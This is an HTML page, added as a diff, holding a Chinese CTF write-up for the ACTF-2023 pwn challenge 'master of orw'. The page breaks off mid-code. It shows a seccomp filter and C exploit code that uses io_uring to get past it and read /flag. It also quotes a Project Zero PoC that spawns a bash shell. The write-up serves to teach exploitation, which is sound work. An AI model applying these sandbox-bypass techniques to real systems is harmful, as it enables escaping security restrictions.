@@ -1,0 +1,559 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>ACTF-2023 WP | scu-ctf.github.io</title>
+<meta name="generator" content="Jekyll v3.9.3" />
+<meta property="og:title" content="ACTF-2023 WP" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="scu-ctf平台上题目的Writeup" />
+<meta property="og:description" content="scu-ctf平台上题目的Writeup" />
+<link rel="canonical" href="http://wiki.scuctf.com/docs/WriteUp/2023/ACTF-wp.html" />
+<meta property="og:url" content="http://wiki.scuctf.com/docs/WriteUp/2023/ACTF-wp.html" />
+<meta property="og:site_name" content="scu-ctf.github.io" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="ACTF-2023 WP" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"scu-ctf平台上题目的Writeup","headline":"ACTF-2023 WP","url":"http://wiki.scuctf.com/docs/WriteUp/2023/ACTF-wp.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=530829236decef647bbc5ba5fa194d7fba763727">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+  <body>
+    <div class="container-lg px-3 my-5 markdown-body">
+      
+      <h1><a href="http://wiki.scuctf.com/">scu-ctf.github.io</a></h1>
+      
+
+      <h1 id="actf-2023-wp">ACTF-2023 WP</h1>
+<h2 id="pwn">PWN</h2>
+<h3 id="master-of-orw">master of orw</h3>
+<p>查看保护：</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0000: 0x20 0x00 0x00 0x00000004  A <span class="o">=</span> <span class="nb">arch
+</span>0001: 0x15 0x00 0x19 0xc000003e  <span class="k">if</span> <span class="o">(</span>A <span class="o">!=</span> ARCH_X86_64<span class="o">)</span> goto 0027
+0002: 0x20 0x00 0x00 0x00000000  A <span class="o">=</span> sys_number
+0003: 0x35 0x00 0x01 0x40000000  <span class="k">if</span> <span class="o">(</span>A &lt; 0x40000000<span class="o">)</span> goto 0005
+0004: 0x15 0x00 0x16 0xffffffff  <span class="k">if</span> <span class="o">(</span>A <span class="o">!=</span> 0xffffffff<span class="o">)</span> goto 0027
+0005: 0x15 0x15 0x00 0x00000000  <span class="k">if</span> <span class="o">(</span>A <span class="o">==</span> <span class="nb">read</span><span class="o">)</span> goto 0027
+0006: 0x15 0x14 0x00 0x00000001  <span class="k">if</span> <span class="o">(</span>A <span class="o">==</span> write<span class="o">)</span> goto 0027
+0007: 0x15 0x13 0x00 0x00000002  <span class="k">if</span> <span class="o">(</span>A <span class="o">==</span> open<span class="o">)</span> goto 0027
+0008: 0x15 0x12 0x00 0x00000011  <span class="k">if</span> <span class="o">(</span>A <span class="o">==</span> pread64<span class="o">)</span> goto 0027
+0009: 0x15 0x11 0x00 0x00000012  <span class="k">if</span> <span class="o">(</span>A <span class="o">==</span> pwrite64<span class="o">)</span> goto 0027
+0010: 0x15 0x10 0x00 0x00000013  <span class="k">if</span> <span class="o">(</span>A <span class="o">==</span> readv<span class="o">)</span> goto 0027
+0011: 0x15 0x0f 0x00 0x00000014  <span class="k">if</span> <span class="o">(</span>A <span class="o">==</span> writev<span class="o">)</span> goto 0027
+0012: 0x15 0x0e 0x00 0x00000028  <span class="k">if</span> <span class="o">(</span>A <span class="o">==</span> sendfile<span class="o">)</span> goto 0027
+0013: 0x15 0x0d 0x00 0x0000002c  <span class="k">if</span> <span class="o">(</span>A <span class="o">==</span> sendto<span class="o">)</span> goto 0027
+0014: 0x15 0x0c 0x00 0x0000002e  <span class="k">if</span> <span class="o">(</span>A <span class="o">==</span> sendmsg<span class="o">)</span> goto 0027
+0015: 0x15 0x0b 0x00 0x0000003b  <span class="k">if</span> <span class="o">(</span>A <span class="o">==</span> execve<span class="o">)</span> goto 0027
+0016: 0x15 0x0a 0x00 0x00000101  <span class="k">if</span> <span class="o">(</span>A <span class="o">==</span> openat<span class="o">)</span> goto 0027
+0017: 0x15 0x09 0x00 0x00000127  <span class="k">if</span> <span class="o">(</span>A <span class="o">==</span> preadv<span class="o">)</span> goto 0027
+0018: 0x15 0x08 0x00 0x00000128  <span class="k">if</span> <span class="o">(</span>A <span class="o">==</span> pwritev<span class="o">)</span> goto 0027
+0019: 0x15 0x07 0x00 0x0000012f  <span class="k">if</span> <span class="o">(</span>A <span class="o">==</span> name_to_handle_at<span class="o">)</span> goto 0027
+0020: 0x15 0x06 0x00 0x00000130  <span class="k">if</span> <span class="o">(</span>A <span class="o">==</span> open_by_handle_at<span class="o">)</span> goto 0027
+0021: 0x15 0x05 0x00 0x00000142  <span class="k">if</span> <span class="o">(</span>A <span class="o">==</span> execveat<span class="o">)</span> goto 0027
+0022: 0x15 0x04 0x00 0x00000147  <span class="k">if</span> <span class="o">(</span>A <span class="o">==</span> preadv2<span class="o">)</span> goto 0027
+0023: 0x15 0x03 0x00 0x00000148  <span class="k">if</span> <span class="o">(</span>A <span class="o">==</span> pwritev2<span class="o">)</span> goto 0027
+0024: 0x15 0x02 0x00 0x000001ac  <span class="k">if</span> <span class="o">(</span>A <span class="o">==</span> 0x1ac<span class="o">)</span> goto 0027
+0025: 0x15 0x01 0x00 0x000001b5  <span class="k">if</span> <span class="o">(</span>A <span class="o">==</span> 0x1b5<span class="o">)</span> goto 0027
+0026: 0x06 0x00 0x00 0x7fff0000  <span class="k">return </span>ALLOW
+0027: 0x06 0x00 0x00 0x00000000  <span class="k">return </span>KILL
+</code></pre></div></div>
+
+<p>没有其他东西，就是绕过沙盒即可。</p>
+
+<p>一看就是把已知的orw方式全部禁用了，基本上常用的不用考虑了，考虑一下异步io的方式，一开始想的很简单，就用库就行了，然后找每个函数的系统调用即可。然后写出了我们的第一版poc：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;liburing.h&gt;
+#define BUFFER_SIZE 1024
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="k">struct</span> <span class="n">io_uring</span> <span class="n">ring1</span><span class="p">,</span> <span class="n">ring2</span><span class="p">,</span> <span class="n">ring3</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>
+    
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">io_uring_queue_init</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ring1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="k">struct</span> <span class="n">io_uring_sqe</span> <span class="o">*</span><span class="n">sqe1</span> <span class="o">=</span> <span class="n">io_uring_get_sqe</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ring1</span><span class="p">);</span>
+    <span class="n">io_uring_prep_openat</span><span class="p">(</span><span class="n">sqe1</span><span class="p">,</span> <span class="o">-</span><span class="mi">100</span><span class="p">,</span> <span class="s">"/flag"</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">io_uring_submit</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ring1</span><span class="p">);</span>
+    <span class="k">struct</span> <span class="n">io_uring_cqe</span> <span class="o">*</span><span class="n">cqe1</span><span class="p">;</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">io_uring_wait_cqe</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ring1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cqe1</span><span class="p">);</span>
+    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">cqe1</span><span class="o">-&gt;</span><span class="n">res</span><span class="p">;</span>
+    <span class="n">io_uring_queue_exit</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ring1</span><span class="p">);</span>
+
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">io_uring_queue_init</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ring2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="k">struct</span> <span class="n">io_uring_sqe</span> <span class="o">*</span><span class="n">sqe2</span> <span class="o">=</span> <span class="n">io_uring_get_sqe</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ring2</span><span class="p">);</span>
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="n">BUFFER_SIZE</span><span class="p">];</span>
+    <span class="n">io_uring_prep_read</span><span class="p">(</span><span class="n">sqe2</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">BUFFER_SIZE</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">io_uring_submit</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ring2</span><span class="p">);</span>
+    <span class="k">struct</span> <span class="n">io_uring_cqe</span> <span class="o">*</span><span class="n">cqe2</span><span class="p">;</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">io_uring_wait_cqe</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ring2</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cqe2</span><span class="p">);</span>
+    <span class="kt">int</span> <span class="n">bytes_read</span> <span class="o">=</span> <span class="n">cqe2</span><span class="o">-&gt;</span><span class="n">res</span><span class="p">;</span>
+    <span class="n">io_uring_queue_exit</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ring2</span><span class="p">);</span>
+
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">io_uring_queue_init</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ring3</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="k">struct</span> <span class="n">io_uring_sqe</span> <span class="o">*</span><span class="n">sqe3</span> <span class="o">=</span> <span class="n">io_uring_get_sqe</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ring2</span><span class="p">);</span>
+    <span class="n">io_uring_prep_write</span><span class="p">(</span><span class="n">sqe3</span><span class="p">,</span> <span class="n">STDOUT_FILENO</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">bytes_read</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">io_uring_submit</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ring2</span><span class="p">);</span>
+    <span class="k">struct</span> <span class="n">io_uring_cqe</span> <span class="o">*</span><span class="n">cqe3</span><span class="p">;</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">io_uring_wait_cqe</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ring2</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cqe3</span><span class="p">);</span>
+    <span class="n">io_uring_queue_exit</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ring3</span><span class="p">);</span>
+    <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+    
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>只需要引入<code class="language-plaintext highlighter-rouge">liburing.h</code>库就行了，但是里面的函数调用全是封装好的，虽然确实能绕过，但是要是想改成只能使用系统调用的汇编指令，太麻烦了。我们gdb动调跟踪，发现其实主要就是使用了两个系统调用，0x1a9和0x1aa，其他的部分都是一些对于结构体的处理，也就是说，其实根本上就是使用这两个系统调用来实现的。</p>
+
+<p>们先查资料，其实本质上来说这个库就是对于<code class="language-plaintext highlighter-rouge">io_uring</code>的封装，这两个最重要的系统调用就是<code class="language-plaintext highlighter-rouge">io_uring_setup</code>和<code class="language-plaintext highlighter-rouge">io_uring_enter</code>，</p>
+
+<p>第一个是设置 <code class="language-plaintext highlighter-rouge">io_uring</code> 实例的系统调用</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="kt">int</span> <span class="nf">io_uring_setup</span><span class="p">(</span><span class="kt">unsigned</span> <span class="n">entries</span><span class="p">,</span> <span class="k">struct</span> <span class="n">io_uring_params</span> <span class="o">*</span><span class="n">params</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>应用程序必须提供条目的数量<code class="language-plaintext highlighter-rouge">entries</code>给 io_uring 实例，并且提供相关的参数 <code class="language-plaintext highlighter-rouge">params</code></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">entries</code>表示与 io_uring 相关联的 sqe 数量的平方数，他必须是 2 的幂，[1,4096]</li>
+  <li><code class="language-plaintext highlighter-rouge">params</code> 结构会被内核读取和写入</li>
+</ul>
+
+<p>第二个是来通知内核，有请求需要处理</p>
+
+<pre><code class="language-C">int io_uring_enter(unsigned int fd, unsigned int to_submit, unsigned int min_complete, unsigned int flags, sigset_t sig);
+</code></pre>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">fd</code> 指 <code class="language-plaintext highlighter-rouge">io_ursing_setup</code> 返回 <code class="language-plaintext highlighter-rouge">io_uring</code>的文件描述符</li>
+  <li><code class="language-plaintext highlighter-rouge">to_submit</code> 告诉内核准备消费的提交的<code class="language-plaintext highlighter-rouge">sqe</code>数量</li>
+  <li><code class="language-plaintext highlighter-rouge">min_complete</code> 要求内核等待请求完成数量</li>
+  <li><code class="language-plaintext highlighter-rouge">flags</code>包含用来修改调用行为的标识符</li>
+</ul>
+
+<p><strong>只需要一次调用就完成了提交和等待完成，也就是说应用程序可以通过一个系统调用来提交并等待指定数量的请求完成</strong>
+其中还有一些我们需要用到的重要结构体的构造：</p>
+
+<p><code class="language-plaintext highlighter-rouge">io_uring</code> API 定义了下列 <code class="language-plaintext highlighter-rouge">mmap</code> 偏移量，以供应用使用</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define IORING_OFF_SQ_RING OULL
+#define IORING_OFF_CQ_RING 0x8000000ULL
+#define IORING_OFF_SQES 0x10000000ULL
+</span></code></pre></div></div>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">IORING_OFF_SQ_RING</code> 用于将 SQ 环映射到应用程序空间</li>
+  <li><code class="language-plaintext highlighter-rouge">IORING_OFF_CQ_RING</code> 用于 CQ 环</li>
+  <li><code class="language-plaintext highlighter-rouge">IORING_OFF_SQES</code> 映射 sqes 数组</li>
+</ul>
+
+<p>然后呢？怎么写？还是不太会，但是我们可以去找前人的肩膀：</p>
+
+<blockquote>
+  <p>https://bugs.chromium.org/p/project-zero/issues/detail?id=2011</p>
+</blockquote>
+
+<p>这位大哥的代码是一个cve的poc，不是完全契合我们的要求，但是他是从底层实现了提交请求并完成调用，看看他的源代码：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define _GNU_SOURCE
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;err.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/syscall.h&gt;
+#include "linux/io_uring.h"
+</span>
+<span class="cp">#ifndef SYS_io_uring_enter
+#define SYS_io_uring_enter 426
+#endif
+#ifndef SYS_io_uring_setup
+#define SYS_io_uring_setup 425
+#endif
+</span>
+<span class="cp">#define SYSCHK(x) ({          \
+  typeof(x) __res = (x);      \
+  if (__res == (typeof(x))-1) \
+    err(1, "SYSCHK(" #x ")"); \
+  __res;                      \
+})
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="c1">// initialize uring</span>
+  <span class="k">struct</span> <span class="n">io_uring_params</span> <span class="n">params</span> <span class="o">=</span> <span class="p">{};</span>
+  <span class="kt">int</span> <span class="n">uring_fd</span> <span class="o">=</span> <span class="n">SYSCHK</span><span class="p">(</span><span class="n">syscall</span><span class="p">(</span><span class="n">SYS_io_uring_setup</span><span class="p">,</span> <span class="cm">/*entries=*/</span><span class="mi">10</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">params</span><span class="p">));</span>
+  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">sq_ring</span> <span class="o">=</span> <span class="n">SYSCHK</span><span class="p">(</span><span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">uring_fd</span><span class="p">,</span> <span class="n">IORING_OFF_SQ_RING</span><span class="p">));</span>
+  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">cq_ring</span> <span class="o">=</span> <span class="n">SYSCHK</span><span class="p">(</span><span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">uring_fd</span><span class="p">,</span> <span class="n">IORING_OFF_CQ_RING</span><span class="p">));</span>
+  <span class="k">struct</span> <span class="n">io_uring_sqe</span> <span class="o">*</span><span class="n">sqes</span> <span class="o">=</span> <span class="n">SYSCHK</span><span class="p">(</span><span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">uring_fd</span><span class="p">,</span> <span class="n">IORING_OFF_SQES</span><span class="p">));</span>
+
+  <span class="c1">// execute openat via uring</span>
+  <span class="n">sqes</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">io_uring_sqe</span><span class="p">){</span>
+      <span class="p">.</span><span class="n">opcode</span> <span class="o">=</span> <span class="n">IORING_OP_OPENAT</span><span class="p">,</span>
+      <span class="p">.</span><span class="n">flags</span> <span class="o">=</span> <span class="n">IOSQE_ASYNC</span><span class="p">,</span>
+      <span class="p">.</span><span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/"</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">),</span>
+      <span class="p">.</span><span class="n">addr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="s">"/"</span><span class="p">,</span>
+      <span class="p">.</span><span class="n">open_flags</span> <span class="o">=</span> <span class="n">O_PATH</span> <span class="o">|</span> <span class="n">O_DIRECTORY</span><span class="p">};</span>
+  <span class="p">((</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="n">sq_ring</span> <span class="o">+</span> <span class="n">params</span><span class="p">.</span><span class="n">sq_off</span><span class="p">.</span><span class="n">array</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="n">sq_ring</span> <span class="o">+</span> <span class="n">params</span><span class="p">.</span><span class="n">sq_off</span><span class="p">.</span><span class="n">tail</span><span class="p">))</span><span class="o">++</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">submitted</span> <span class="o">=</span> <span class="n">SYSCHK</span><span class="p">(</span><span class="n">syscall</span><span class="p">(</span><span class="n">SYS_io_uring_enter</span><span class="p">,</span> <span class="n">uring_fd</span><span class="p">,</span> <span class="cm">/*to_submit=*/</span><span class="mi">1</span><span class="p">,</span> <span class="cm">/*min_complete=*/</span><span class="mi">1</span><span class="p">,</span> <span class="cm">/*flags=*/</span><span class="n">IORING_ENTER_GETEVENTS</span><span class="p">,</span> <span class="cm">/*sig=*/</span><span class="nb">NULL</span><span class="p">,</span> <span class="cm">/*sigsz=*/</span><span class="mi">0</span><span class="p">));</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"submitted %d, getevents done</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">submitted</span><span class="p">);</span>
+  <span class="kt">int</span> <span class="n">cq_tail</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="n">cq_ring</span> <span class="o">+</span> <span class="n">params</span><span class="p">.</span><span class="n">cq_off</span><span class="p">.</span><span class="n">tail</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"cq_tail = %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">cq_tail</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">cq_tail</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span>
+    <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"expected cq_tail==1"</span><span class="p">);</span>
+  <span class="k">struct</span> <span class="n">io_uring_cqe</span> <span class="o">*</span><span class="n">cqe</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">cq_ring</span> <span class="o">+</span> <span class="n">params</span><span class="p">.</span><span class="n">cq_off</span><span class="p">.</span><span class="n">cqes</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">cqe</span><span class="o">-&gt;</span><span class="n">res</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"result: %d (%s)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">cqe</span><span class="o">-&gt;</span><span class="n">res</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="o">-</span><span class="n">cqe</span><span class="o">-&gt;</span><span class="n">res</span><span class="p">));</span>
+  <span class="p">}</span>
+  <span class="k">else</span>
+  <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"result: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">cqe</span><span class="o">-&gt;</span><span class="n">res</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"launching shell</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">"bash"</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"exiting</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>我们根据我们的第一个poc去查看提交open请求时的构造源码：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">io_uring_prep_openat</span><span class="p">(</span><span class="k">struct</span> <span class="n">io_uring_sqe</span> <span class="o">*</span><span class="n">sqe</span><span class="p">,</span> <span class="kt">int</span> <span class="n">dfd</span><span class="p">,</span>
+					<span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">,</span> <span class="n">mode_t</span> <span class="n">mode</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="n">io_uring_prep_rw</span><span class="p">(</span><span class="n">IORING_OP_OPENAT</span><span class="p">,</span> <span class="n">sqe</span><span class="p">,</span> <span class="n">dfd</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">mode</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+	<span class="n">sqe</span><span class="o">-&gt;</span><span class="n">open_flags</span> <span class="o">=</span> <span class="p">(</span><span class="n">__u32</span><span class="p">)</span> <span class="n">flags</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>再查看函数<code class="language-plaintext highlighter-rouge">io_uring_prep_rw</code>：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">io_uring_prep_rw</span><span class="p">(</span><span class="kt">int</span> <span class="n">op</span><span class="p">,</span> <span class="k">struct</span> <span class="n">io_uring_sqe</span> <span class="o">*</span><span class="n">sqe</span><span class="p">,</span> <span class="kt">int</span> <span class="n">fd</span><span class="p">,</span>
+				    <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">addr</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">len</span><span class="p">,</span>
+				    <span class="n">__u64</span> <span class="n">offset</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="n">sqe</span><span class="o">-&gt;</span><span class="n">opcode</span> <span class="o">=</span> <span class="p">(</span><span class="n">__u8</span><span class="p">)</span> <span class="n">op</span><span class="p">;</span>
+	<span class="n">sqe</span><span class="o">-&gt;</span><span class="n">flags</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">sqe</span><span class="o">-&gt;</span><span class="n">ioprio</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">sqe</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">fd</span><span class="p">;</span>
+	<span class="n">sqe</span><span class="o">-&gt;</span><span class="n">off</span> <span class="o">=</span> <span class="n">offset</span><span class="p">;</span>
+	<span class="n">sqe</span><span class="o">-&gt;</span><span class="n">addr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">addr</span><span class="p">;</span>
+	<span class="n">sqe</span><span class="o">-&gt;</span><span class="n">len</span> <span class="o">=</span> <span class="n">len</span><span class="p">;</span>
+	<span class="n">sqe</span><span class="o">-&gt;</span><span class="n">rw_flags</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">sqe</span><span class="o">-&gt;</span><span class="n">user_data</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">sqe</span><span class="o">-&gt;</span><span class="n">buf_index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">sqe</span><span class="o">-&gt;</span><span class="n">personality</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">sqe</span><span class="o">-&gt;</span><span class="n">file_index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">sqe</span><span class="o">-&gt;</span><span class="n">__pad2</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">sqe</span><span class="o">-&gt;</span><span class="n">__pad2</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>因此我们修改<code class="language-plaintext highlighter-rouge">sqes[0]</code>处的结构体为：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">sqes</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">io_uring_sqe</span><span class="p">){</span>
+      <span class="p">.</span><span class="n">opcode</span> <span class="o">=</span> <span class="n">IORING_OP_OPENAT</span><span class="p">,</span>
+      <span class="p">.</span><span class="n">flags</span> <span class="o">=</span> <span class="n">IOSQE_ASYNC</span><span class="p">,</span>
+      <span class="p">.</span><span class="n">addr</span> <span class="o">=</span> <span class="s">"/flag"</span><span class="p">,</span>
+      <span class="p">.</span><span class="n">open_flags</span> <span class="o">=</span> <span class="n">O_RDONLY</span><span class="p">,</span>
+  <span class="p">};</span>
+</code></pre></div></div>
+
+<p>然后再根据第一个poc的方式将<code class="language-plaintext highlighter-rouge">cqe-&gt;res</code>赋值给文件fd，我们得到如下代码：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define _GNU_SOURCE
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;err.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/syscall.h&gt;
+#include "linux/io_uring.h"
+</span>
+<span class="cp">#ifndef SYS_io_uring_enter
+#define SYS_io_uring_enter 426
+#endif
+#ifndef SYS_io_uring_setup
+#define SYS_io_uring_setup 425
+#endif
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="c1">// initialize uring</span>
+  <span class="k">struct</span> <span class="n">io_uring_params</span> <span class="n">params</span> <span class="o">=</span> <span class="p">{};</span>
+  <span class="kt">int</span> <span class="n">opened_fd</span><span class="p">;</span>
